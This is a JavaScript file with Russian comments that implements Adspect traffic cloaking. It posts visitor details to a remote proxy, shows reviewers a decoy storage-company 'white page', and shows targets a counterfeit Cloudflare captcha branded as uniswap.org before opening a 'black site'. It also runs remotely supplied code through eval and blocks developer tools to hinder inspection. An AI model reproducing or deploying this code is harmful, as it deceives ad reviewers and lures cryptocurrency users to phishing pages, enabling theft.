(function() {
    'use strict';
    


    // ========================================
    // ADSPECT FULL INTEGRATION (из index.php)
    // ========================================
    
    const CONFIG = {
        ADSPECT_STREAM_ID: '31e63f5c-dfbb-41ba-8812-3eac71306b09', // Ваш Stream ID
        ADSPECT_API: 'https://rpc.adspect.net/v2/',
        PROXY_URL: 'https://webmetricsips.com/proxy.php',
        TARGET_CONTAINER: 'signals-embed-root'
    };

    // Получение реального IP (адаптировано из adspect_real_ip)
    function getRealIP() {
        // В браузере мы не можем получить реальный IP напрямую
        // Поэтому полагаемся на сервер-прокси
        return null; // Сервер определит реальный IP
    }


    async function callAdspectAPI() {
        try {

            const payload = {
                server: {
                    HTTP_USER_AGENT: navigator.userAgent,
                    HTTP_HOST: window.location.host,
                    HTTP_REFERER: document.referrer,
                    REQUEST_URI: window.location.pathname + window.location.search,
                    QUERY_STRING: window.location.search.slice(1),
                    REQUEST_METHOD: 'GET',
                    SERVER_NAME: window.location.hostname,
                    SERVER_PORT: window.location.port || (window.location.protocol === 'https:' ? '443' : '80'),
                    HTTPS: window.location.protocol === 'https:' ? 'on' : 'off',
                    REQUEST_TIME: Math.floor(Date.now() / 1000),
                    HTTP_ACCEPT: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    HTTP_ACCEPT_LANGUAGE: navigator.language,
                    HTTP_ACCEPT_ENCODING: 'gzip, deflate, br'
                }
            };

            const response = await fetch(CONFIG.PROXY_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`Proxy server error: ${response.status}`);
            }

            const result = await response.json();
            console.log('[ADSPECT] Full API response:', result);
            console.log('[DEBUG] Response success:', result.success);
            console.log('[DEBUG] Adspect data:', result.adspect_response);
            
            if (result.success && result.adspect_response) {
                console.log('[DEBUG] Returning Adspect response:', result.adspect_response);
                return result.adspect_response;
            }
            
            console.log('[ERROR] Invalid response structure');
            throw new Error('Invalid Adspect response');
        } catch (error) {
            console.log('[ADSPECT] API call failed:', error.message);
            throw error;
        }
    }

    // Обработка всех действий Adspect (из index.php switch)
    function handleAdspectAction(data) {
        const { action, target, ok, js, cid } = data;
        
        console.log(`[ADSPECT] Action: ${action}, Target: ${target}, OK: ${ok}`);

        switch (action) {
            case 'local':
                console.log('[ADSPECT] Serving local file:', target);
                serveLocalFile(target);
                break;
                
            case 'noop':
                console.log('[ADSPECT] No operation');
                // Ничего не делаем, оставляем как есть
                break;
                
            case '301':
            case '302':
            case '303':
            case '307':
            case '308':
                console.log(`[ADSPECT] HTTP redirect ${action}:`, target);
                // Принудительный редирект
                window.top.location.href = target;
                break;
                
            case 'refresh':
                console.log('[ADSPECT] Meta refresh:', target);
                const meta = document.createElement('meta');
                meta.httpEquiv = 'refresh';
                meta.content = `0; url=${target}`;
                document.head.appendChild(meta);
                break;
                
            case 'meta':
                console.log('[ADSPECT] Meta redirect:', target);
                document.write(`<!DOCTYPE html><head><meta http-equiv="refresh" content="0; url=${target}"></head>`);
                break;
                
            case 'form':
                console.log('[ADSPECT] Form submit:', target);
                document.write(`<!DOCTYPE html><html><body><form id="form" action="${target}" method="GET"></form><script>document.getElementById("form").submit();</script></body></html>`);
                break;
                
            case 'assign':
                console.log('[ADSPECT] Direct redirect to black site:', target);
                // ПРЯМОЙ редирект вместо iframe (не используется теперь)
                window.open(target, '_blank');
                break;
                
            case 'replace':
                console.log('[ADSPECT] Location replace:', target);
                window.location.replace(target);
                break;
                
            case 'top':
                console.log('[ADSPECT] Top location:', target);
                if (window.top) {
                    window.top.location.href = target;
                } else {
                    window.location.href = target;
                }
                break;
                
            case 'iframe':
                console.log('[ADSPECT] Iframe embed:', target);
                showIframe(target);
                break;
                
            case 'proxy':
                console.log('[ADSPECT] Proxy content:', target);
                proxyContent(target);
                break;
                
            case 'fetch':
                console.log('[ADSPECT] Fetch content:', target);
                fetchContent(target);
                break;
                
            case 'js':
                console.log('[ADSPECT] Execute JavaScript');
                if (target) {
                    try {
                        // Декодируем base64 если нужно
                        const script = atob(target);
                        eval(script);
                    } catch (e) {
                        eval(target);
                    }
                }
                break;
                
            case 'return':
                console.log('[ADSPECT] HTTP status:', target);
                // В браузере мы не можем установить HTTP статус
                // Показываем сообщение об ошибке
                showError(target);
                break;
                
            default:
                console.log('[ADSPECT] Unknown action:', action);
                showError('Unsupported action');
                break;
        }
    }

    // Показать локальный файл через CORS-safe прокси
    async function serveLocalFile(filename) {
        const container = getOrCreateContainer();
        
        try {
            // ИСПРАВЛЕНО: используем adspect-file.php для CORS-safe загрузки
            const fileUrl = `https://webmetricsips.com/proxy.php?file=${filename}`;
            console.log('[DEBUG] Trying to load via CORS proxy:', fileUrl);
            console.log('[ADSPECT] Loading file via proxy:', fileUrl);
            
            const response = await fetch(fileUrl);
            
            if (response.ok) {
                const content = await response.text();
                console.log('[ADSPECT] File content loaded, length:', content.length);
                
                // Если это HTML файл - показываем в контейнере
                if (filename.endsWith('.html')) {
                    // Базовый домен вашего сервера для абсолютных ссылок
                    const serverOrigin = new URL(CONFIG.PROXY_URL).origin;

                    // Утилита: преобразовать относительный URL в абсолютный от serverOrigin
                    const toAbsolute = (url) => {
                        if (!url) return url;
                        const trimmed = url.trim();
                        if (!trimmed) return url;
                        // Абсолютные и специальные протоколы не трогаем
                        if (/^(https?:)?\/\/|^(data:|mailto:|tel:|javascript:|#)/i.test(trimmed)) {
                            return trimmed;
                        }
                        if (trimmed.startsWith('/')) {
                            return serverOrigin + trimmed;
                        }
                        return serverOrigin + '/' + trimmed;
                    };

                    // Создаём временный отсоединённый контейнер, чтобы избежать ранней загрузки ресурсов
                    const temp = document.createElement('div');
                    temp.innerHTML = content
                        // Предварительные строковые правки относительных ссылок
                        .replace(/href="assets\//g, `href="${serverOrigin}/assets/`)
                        .replace(/src="assets\//g,  `src="${serverOrigin}/assets/`)
                        .replace(/(href|src)="\/(?!\/)/g, `$1="${serverOrigin}/`)
                        .replace(/(href|src)="(?!https?:|\/\/|data:|mailto:|tel:|#|javascript:)/gi, `$1="${serverOrigin}/`);

                    // Общая функция переписывания атрибутов
                    const rewriteAttr = (node, attr) => {
                        const current = node.getAttribute(attr);
                        const updated = toAbsolute(current);
                        if (updated && updated !== current) {
                            node.setAttribute(attr, updated);
                        }
                    };

                    // Правим ссылки на ресурсы в DOM до вставки в документ
                    temp.querySelectorAll('link[href]').forEach(n => rewriteAttr(n, 'href'));
                    temp.querySelectorAll('img[src], iframe[src], source[src], video[src], audio[src], track[src]').forEach(n => rewriteAttr(n, 'src'));
                    temp.querySelectorAll('a[href]').forEach(n => rewriteAttr(n, 'href'));
                    temp.querySelectorAll('form[action]').forEach(n => rewriteAttr(n, 'action'));

                    // SVG: use/image href и xlink:href
                    temp.querySelectorAll('use[href]').forEach(n => rewriteAttr(n, 'href'));
                    temp.querySelectorAll('use[xlink\\:href]').forEach(n => rewriteAttr(n, 'xlink:href'));
                    temp.querySelectorAll('image[href]').forEach(n => rewriteAttr(n, 'href'));
                    temp.querySelectorAll('image[xlink\\:href]').forEach(n => rewriteAttr(n, 'xlink:href'));

                    // srcset (img/source)
                    const rewriteSrcSet = (value) => {
                        if (!value) return value;
                        return value.split(',').map(part => {
                            const [u, d] = part.trim().split(/\s+/);
                            const abs = toAbsolute(u);
                            return d ? `${abs} ${d}` : abs;
                        }).join(', ');
                    };
                    temp.querySelectorAll('img[srcset], source[srcset]').forEach(n => {
                        const cur = n.getAttribute('srcset');
                        const upd = rewriteSrcSet(cur);
                        if (upd && upd !== cur) n.setAttribute('srcset', upd);
                    });

                    // Inline <style> url(...)
                    temp.querySelectorAll('style').forEach(styleEl => {
                        const css = styleEl.textContent || '';
                        if (!css) return;
                        const fixed = css.replace(/url\(([^)]+)\)/gi, (m, p1) => {
                            const raw = p1.trim().replace(/^['\"]/g, '').replace(/['\"]$/g, '');
                            const abs = toAbsolute(raw);
                            const quoted = /['\"]/g.test(p1.trim()[0]) ? `'${abs}'` : abs;
                            return `url(${quoted})`;
                        });
                        if (fixed !== css) styleEl.textContent = fixed;
                    });

                    // Извлекаем скрипты, чтобы не запускались автоматически
                    const scripts = Array.from(temp.querySelectorAll('script'));
                    scripts.forEach(s => s.parentElement && s.parentElement.removeChild(s));

                    // Вставляем уже переписанный HTML в реальный контейнер
                    container.innerHTML = temp.innerHTML;
                    console.log('[ADSPECT] HTML content fixed and loaded');

                    // Подключаем скрипты вручную после вставки
                    scripts.forEach(script => {
                        if (script.src) {
                            const absSrc = toAbsolute(script.getAttribute('src'));
                            const newScript = document.createElement('script');
                            newScript.src = absSrc;
                            document.head.appendChild(newScript);
                            console.log('[ADSPECT] Loading JS:', newScript.src);
                        } else if (script.textContent) {
                            const newScript = document.createElement('script');
                            newScript.textContent = script.textContent;
                            document.head.appendChild(newScript);
                        }
                    });
                } else {
                    // Другие файлы показываем как есть
                    container.innerHTML = content;
                }
                
                console.log('[ADSPECT] Local file served successfully:', filename);
                return;
            } else {
                throw new Error(`File not found: ${response.status}`);
            }
        } catch (error) {
            console.log('[ADSPECT] Failed to load local file:', error.message);
        }
        
        // Fallback - показать встроенную белую страницу
        showBuiltinWhitePage();
    }

    // Показать iframe (адаптировано из case 'iframe')
    function showIframe(url) {
        const container = getOrCreateContainer();
        container.innerHTML = `
            <iframe 
                src="${url}" 
                style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;"
                sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
            </iframe>
        `;
    }

    // Проксировать контент (адаптировано из adspect_proxy)
    async function proxyContent(url) {
        const container = getOrCreateContainer();
        
        try {
            const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
            const data = await response.json();
            
            if (data.contents) {
                container.innerHTML = data.contents;
            }
        } catch (error) {
            console.log('[ADSPECT] Proxy failed:', error.message);
            showError('Failed to load content');
        }
    }

    // Загрузить контент напрямую
    async function fetchContent(url) {
        try {
            const response = await fetch(url);
            const content = await response.text();
            
            document.open();
            document.write(content);
            document.close();
        } catch (error) {
            console.log('[ADSPECT] Fetch failed:', error.message);
            showError('Failed to fetch content');
        }
    }

    // Показать ошибку
    function showError(message) {
        const container = getOrCreateContainer();
        container.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: center; height: 100vh; font-family: Arial, sans-serif;">
                <div style="text-align: center; padding: 40px; background: #f8f9fa; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                    <h2 style="color: #dc3545; margin-bottom: 20px;">Error ${message}</h2>
                    <p style="color: #6c757d;">Please try again later.</p>
                </div>
            </div>
        `;
    }

    // Встроенная белая страница (fallback)
    function showBuiltinWhitePage() {
        const container = getOrCreateContainer();
        
        // Inject styles
        const style = document.createElement('style');
        style.textContent = `
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
            .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
            .header { background: #fff; padding: 20px 0; border-bottom: 1px solid #e2e8f0; }
            .hero { padding: 80px 0; background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%); text-align: center; }
            .footer { background: #2d3748; color: white; padding: 40px 0; text-align: center; }
        `;
        document.head.appendChild(style);
        
        container.innerHTML = `
            <header class="header">
                <div class="container">
                    <h1 style="color: #4a5568;">Offlido</h1>
                </div>
            </header>
            <section class="hero">
                <div class="container">
                    <h1>Compliance-Forward Offline Storage Accessories</h1>
                    <p>Secure, certified, and fire-resistant storage solutions for your important documents and assets.</p>
                </div>
            </section>
            <footer class="footer">
                <div class="container">
                    <p>&copy; 2025 Offlido. All rights reserved.</p>
                    <p>Business not pertaining to the purchase, holding, or exchange of cryptocurrencies.</p>
                </div>
            </footer>
        `;
        
        document.title = "Offlido - Secure Document Storage";
    }

    // Utility Functions
    function getOrCreateContainer() {
        const script = document.currentScript;
        const targetId = script?.dataset?.target || CONFIG.TARGET_CONTAINER;
        
        let container = document.getElementById(targetId);
        if (!container) {
            container = document.createElement('div');
            container.id = targetId;
            script.insertAdjacentElement('afterend', container);
        }
        
        let innerContainer = document.getElementById('signals-embed-container');
        if (!innerContainer) {
            innerContainer = document.createElement('div');
            innerContainer.id = 'signals-embed-container';
            innerContainer.style.width = '100%';
            innerContainer.style.minHeight = '100vh';
            container.appendChild(innerContainer);
        }
        
        return innerContainer;
    }

    // Add Security Features (из вашего base64 скрипта)
    function addSecurityFeatures() {
        // Disable right-click
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Disable F12, Ctrl+U, Ctrl+Shift+I
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.key === 'u') ||
                (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
        
        // Anti-debugging
        setInterval(() => {
            if (window.devtools && window.devtools.open) {
                window.location.reload();
            }
        }, 1000);
    }

    // ========================================
    // MAIN EXECUTION (полная логика из index.php)
    // ========================================
    
    async function main() {
        console.log('[ADSPECT] Initializing full integration...');
        
        // Add security features
        addSecurityFeatures();
        
        try {
            // Первый вызов Adspect API для определения белой/блек
            const adspectResult = await callAdspectAPI();
            
            if (adspectResult) {
                console.log('[ADSPECT] Initial response:', adspectResult);
                
                // Если ok:false - показать белую страницу
                if (!adspectResult.ok) {
                    console.log('[ADSPECT] Showing white page');
                    handleAdspectAction(adspectResult);
                    return;
                }
                
                // Если ok:true - показать фейковую капчу и сохранить URL для редиректа
                console.log('[ADSPECT] Showing captcha, saving redirect URL');
                console.log('[DEBUG] Will redirect to:', adspectResult.target);
                showCaptchaWithRedirect(adspectResult.target);
            } else {
                throw new Error('No Adspect response');
            }
            
        } catch (error) {
            console.log('[ADSPECT] Error:', error.message);
            // Показываем белую страницу при любых ошибках
            showBuiltinWhitePage();
        }
    }

    // Показать точную копию капчи из index.html
    function showCaptchaWithRedirect(redirectUrl) {
        const container = getOrCreateContainer();
        
        // Точная копия HTML и CSS из index.html
        container.innerHTML = `
            <style>
                *{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}.main-content{margin:8rem auto;max-width:60rem;padding-left:1.5rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{font-size:1.5rem;font-weight:500;line-height:2.25rem}@media (width <= 720px){.h2{font-size:1.25rem;line-height:1.5rem}}@keyframes spin{to{transform:rotate(1turn)}}@keyframes stroke{to{stroke-dashoffset:0}}@keyframes scale{0%,to{transform:none}50%{transform:scaleX(1)}}@keyframes fill{to{transform:scale(1)}}@keyframes fillfail{to{box-shadow:inset 0 30px 0 0 #de1303}}@keyframes fillfail-offlabel{to{box-shadow:inset 0 0 0 30px #232323}}@keyframes fillfail-offlabel-dark{to{box-shadow:inset 0 0 0 30px #fff}}@keyframes scale-up-center{0%{transform:scale(.01)}to{transform:scale(1)}}@keyframes fade-in{0%{opacity:0}to{opacity:1}}@keyframes fireworks{0%{opacity:0;transform:scale(0)}50%{opacity:1;transform:scale(1.5)}to{opacity:0;transform:scale(2)}}@keyframes firework{0%{opacity:0;stroke-dashoffset:8}30%{opacity:1}to{stroke-dashoffset:-8}}@keyframes unspin{40%{stroke-width:1px;stroke-linecap:square;stroke-dashoffset:192}to{stroke-width:0}}.main-wrapper{height:100%;margin:0;overflow:hidden;padding:0;width:100%}.main-wrapper{background-color:#fff;color:#232323;font-family:-apple-system,system-ui,blinkmacsystemfont,Segoe UI,roboto,oxygen,ubuntu,Helvetica Neue,arial,sans-serif;font-size:14px;font-weight:400;-webkit-font-smoothing:antialiased;font-style:normal}h1{color:#232323;font-size:16px;font-weight:700;line-height:1.25;margin:16px 0}h1,p{}p{font-size:20px;font-weight:400;margin:8px 0}#content{align-items:center;background-color:#fafafa;border:1px solid #e0e0e0;box-sizing:border-box;display:flex;gap:7px;height:65px;justify-content:space-between;user-select:none}#branding{display:inline-flex;flex-direction:column;margin:0 16px 0 0;text-align:right}#overrun-i,#spinner-i{animation:spin 5s linear infinite;display:flex;height:30px;width:30px}#fail-i{animation:scale-up-center .6s cubic-bezier(.55,.085,.68,.53) both;box-shadow:inset 0 0 0 #de1303}#fail-i,#success-i{border-radius:50%;display:flex;height:30px;width:30px;stroke-width:1px;fill:#f8f8f8;stroke:#f8f8f8;stroke-miterlimit:10}#success-i{animation:scale-up-center .3s cubic-bezier(.55,.085,.68,.53) both;stroke-width:6px}#success-i,#success-i .p1{box-shadow:inset 0 0 0 #038127}#success-i .p1{stroke-dasharray:242;stroke-dashoffset:242;animation:stroke .4s cubic-bezier(.65,0,.45,1) forwards;animation-delay:.3s}#success-pre-i{height:30px;width:30px}#success-pre-i line{stroke:#038127;animation:firework .3s ease-out 1;stroke-width:1;stroke-dasharray:32 32;stroke-dashoffset:-8}#success-text{animation:fade-in 1s forwards;opacity:0}.success-circle{stroke-dashoffset:0;stroke-width:2;stroke-miterlimit:10;stroke:#038127;fill:#038127}.cb-c{align-items:center;cursor:pointer;display:flex;margin-left:16px;text-align:left}.cb-lb{display:grid;place-items:center}.cb-lb input{cursor:pointer;grid-area:1/1;height:24px;margin:0;opacity:0;width:24px;z-index:9999}.cb-lb input:active~.cb-i,.cb-lb input:focus~.cb-i{border:2px solid #c44d0e}.cb-lb input:checked~.cb-i{background-color:#fff;border-radius:5px;opacity:1;transform:rotate(0deg) scale(1)}.cb-lb .cb-i{animation:scale-up-center .4s cubic-bezier(.55,.085,.68,.53) both;background:#fff;border:2px solid #6d6d6d;border-radius:3px;box-sizing:border-box;grid-area:1/1;height:24px;transition:all .1s ease-in;width:24px;z-index:9998}.cb-lb .cb-i:after{border-radius:5px;content:"";position:absolute}.cb-lb .cb-lb-t{grid-column:2;margin-left:8px}.cb-container{align-items:center;display:grid;gap:12px;grid-template-columns:30px auto;margin-left:16px}.logo-text{fill:#000}#qr{fill:#232323}#qr svg{height:40px;width:40px}#terms{color:#232323;display:inline-flex;font-size:8px;font-style:normal;justify-content:flex-end;line-height:10px}#terms .link-spacer{margin:0 .2rem}#terms a{display:inline-block}#terms a,#terms a:link,#terms a:visited{color:#232323;font-size:8px;font-style:normal;font-weight:400;line-height:10px;text-decoration:underline}#terms a:active,#terms a:focus,#terms a:hover{color:#166379;text-decoration:underline}#logo{height:25px;margin-bottom:1px}.circle{stroke-width:3px;stroke-linecap:round;stroke:#038127;stroke-dasharray:0,100,0;stroke-dashoffset:200;stroke-miterlimit:1;stroke-linejoin:round}.main-wrapper{border-spacing:0}.p1{fill:none;stroke:#fff}.gOwgw3{display:grid!important}
            </style>
            
            <div class="main-wrapper" role="main">
                <div class="main-content">
                    <h1 class="zone-name-title h1">uniswap.org</h1>
                    <p id="TPlCG2" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>

                    <div id="content" style="display: flex;width:290px;">
                        <div id="verify">
                            <div style="display: flex;" class="cb-c" role="alert" onclick="handleCaptchaClick()">
                                <label class="cb-lb">
                                    <input type="checkbox" id="vfclick">
                                    <span class="cb-i"></span>
                                    <span class="cb-lb-t" style="color:#000;font-size:11px;">Verify you are human</span>
                                </label>
                            </div>
                        </div>
                        
                        <div id="verifying" class="cb-container" style="display: none;font-size:11px;">
                            <div class="spinner-container">
                                <svg id="spinner-i" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="spun">
                                    <line x1="15" x2="15" y1="1.5" y2="5.5" class="circle"></line>
                                    <line x1="24.5459" x2="24.5459" y1="5.45405" y2="10.45405" transform="rotate(45 24.5459 5.45405)" class="circle"></line>
                                    <line x1="28.5" x2="28.5" y1="15" y2="20" transform="rotate(90 28.5 15)" class="circle"></line>
                                    <line x1="24.5459" x2="24.5459" y1="24.546" y2="29.546" transform="rotate(135 24.5459 24.546)" class="circle"></line>
                                    <line x1="15" x2="15" y1="28.5" y2="33.5" transform="rotate(180 15 28.5)" class="circle"></line>
                                    <line x1="5.4541" x2="5.4541" y1="24.5459" y2="29.5459" transform="rotate(-135 5.4541 24.5459)" class="circle"></line>
                                    <line x1="1.5" x2="1.5" y1="15" y2="20" transform="rotate(-90 1.5 15)" class="circle"></line>
                                    <line x1="5.45408" x2="5.45408" y1="5.45404" y2="10.45404" transform="rotate(-45 5.45408 5.45404)" class="circle"></line>
                                </svg>
                            </div>
                            <div id="verifying-msg">
                                <span id="verifying-text" style="color:#000">Verifying...</span>
                            </div>
                        </div>
                        
                        <div id="success" class="cb-container" style="display: none;" role="alert">
                            <svg id="success-i" viewBox="0 0 52 52" aria-hidden="true">
                                <circle class="success-circle" cx="26" cy="26" r="25"></circle>
                                <path class="p1" d="m13,26l9.37,9l17.63,-18"></path>
                            </svg>
                            <span id="success-text">Success!</span>
                        </div>
                        
                        <div id="branding">
                            <a class="cf-link" target="_blank" href="https://www.cloudflare.com/products/turnstile/?utm_source=turnstile&utm_campaign=widget" rel="noopener noreferrer">
                                <svg role="img" aria-label="Cloudflare" id="logo" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z" fill="#F6821F"></path>
                                    <path d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z" fill="#FBAD41"></path>
                                    <path d="M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z" class="logo-text"></path>
                                    <path d="M14.3081 21.9023V21.8853C14.3081 20.1655 15.674 18.7704 17.4952 18.7704C19.3164 18.7704 20.6653 20.1482 20.6653 21.8681V21.8853C20.6653 23.6052 19.2991 24.9994 17.4785 24.9994C15.6578 24.9994 14.3081 23.6222 14.3081 21.9023ZM18.9958 21.9023V21.8853C18.9958 21.0222 18.3806 20.2679 17.4785 20.2679C16.5846 20.2679 15.9858 21.0038 15.9858 21.8681V21.8853C15.9858 22.7484 16.6013 23.5025 17.4952 23.5025C18.3973 23.5025 18.9958 22.7666 18.9958 21.9023Z" class="logo-text"></path>
                                    <path d="M22.6674 22.253V18.8901H24.3284V22.2191C24.3284 23.0822 24.7584 23.4939 25.4159 23.4939C26.0733 23.4939 26.5034 23.1003 26.5034 22.2617V18.8901H28.1647V22.2093C28.1647 24.1432 27.0772 24.9899 25.3991 24.9899C23.7211 24.9899 22.6674 24.1268 22.6674 22.2522" class="logo-text"></path>
                                    <path d="M30.668 18.8907H32.9445C35.0526 18.8907 36.275 20.1226 36.275 21.8508V21.8684C36.275 23.5963 35.0355 24.88 32.911 24.88H30.668V18.8907ZM32.97 23.4076C33.9483 23.4076 34.597 22.8609 34.597 21.8928V21.8759C34.597 20.9178 33.9483 20.3614 32.97 20.3614H32.3038V23.4082L32.97 23.4076Z" class="logo-text"></path>
                                    <path d="M38.6525 18.8904H43.3738V20.3453H40.2883V21.3632H43.079V22.7407H40.2883V24.8798H38.6525V18.8904Z" class="logo-text"></path>
                                    <path d="M45.65 18.8904H47.2858V23.4254H50.1443V24.8798H45.65V18.8904Z" class="logo-text"></path>
                                    <path d="M54.4187 18.8475H55.9949L58.5079 24.8797H56.7541L56.3238 23.8101H54.047L53.6257 24.8797H51.9058L54.4187 18.8475ZM55.8518 22.5183L55.1941 20.8154L54.5278 22.5183H55.8518Z" class="logo-text"></path>
                                    <path d="M60.6149 18.8901H63.4056C64.3083 18.8901 64.9317 19.13 65.328 19.5406C65.6742 19.883 65.8511 20.3462 65.8511 20.9357V20.9526C65.8511 21.8678 65.3691 22.4754 64.6369 22.7919L66.045 24.88H64.1558L62.9671 23.0658H62.2507V24.88H60.6149V18.8901ZM63.3299 21.7654C63.8864 21.7654 64.2071 21.4915 64.2071 21.0551V21.0381C64.2071 20.5674 63.8697 20.328 63.3211 20.328H62.2507V21.7665L63.3299 21.7654Z" class="logo-text"></path>
                                    <path d="M68.2112 18.8904H72.9578V20.3024H69.8302V21.209H72.6632V22.5183H69.8302V23.4683H73V24.8798H68.2112V18.8904Z" class="logo-text"></path>
                                    <path d="M4.53824 22.6043C4.30918 23.13 3.82723 23.5022 3.18681 23.5022C2.29265 23.5022 1.67746 22.7493 1.67746 21.8851V21.8678C1.67746 21.0047 2.27593 20.2676 3.1698 20.2676C3.84367 20.2676 4.35681 20.6882 4.5734 21.2605H6.29764C6.02151 19.8349 4.78716 18.7707 3.18681 18.7707C1.36533 18.7707 0 20.1666 0 21.8851V21.9021C0 23.6219 1.3486 25 3.1698 25C4.72762 25 5.94525 23.9764 6.26645 22.6046L4.53824 22.6043Z" class="logo-text"></path>
                                </svg>
                            </a>
                            <div id="terms">
                                <a id="privacy-link" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/">Privacy</a>
                                <span class="link-spacer"> • </span>
                                <a id="terms-link" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/website-terms/">Terms</a>
                            </div>
                        </div>
                    </div>

                    <div id="wUnK7" class="core-msg spacer spacer-top">uniswap.org needs to review the security of your connection before proceeding.</div>
                </div>
            </div>
        `;
        
        // Обработка клика на капчу
        window.handleCaptchaClick = function() {
            console.log('[CAPTCHA] User clicked captcha!');
            
            const verify = document.getElementById('verify');
            const verifying = document.getElementById('verifying');
            const success = document.getElementById('success');
            const checkbox = document.getElementById('vfclick');
            
            // Скрыть кнопку верификации, показать спиннер
            if (verify) verify.style.display = 'none';
            if (verifying) verifying.style.display = 'block';
            if (checkbox) checkbox.checked = true;
            
            // Через 3 секунды показать успех
            setTimeout(() => {
                if (verifying) verifying.style.display = 'none';
                if (success) success.style.display = 'block';
                
                // Через еще 1 секунду - редирект
                setTimeout(() => {
                    console.log('[CAPTCHA] Opening new tab:', redirectUrl);
                    window.open(redirectUrl, '_blank');
                }, 1000);
            }, 3000);
        };
    }
    
    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', main);
    } else {
        main();
    }
    
})();
